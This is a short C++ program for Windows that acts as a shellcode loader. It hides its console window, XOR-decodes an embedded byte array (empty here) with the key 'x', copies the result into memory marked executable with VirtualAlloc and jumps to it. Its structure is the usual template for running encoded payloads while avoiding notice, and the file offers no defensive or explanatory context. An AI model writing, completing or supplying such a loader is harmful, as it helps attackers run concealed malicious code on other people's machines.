#include <cstring>
#include <iostream>
#define _WIN32_WINNT 0x0500
#include<windows.h>
 
int main(int argc, char **argv) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char b[] = {};
	char c[sizeof b];
	for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}
	void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, c, sizeof c);
	((void(*)())exec)();		
}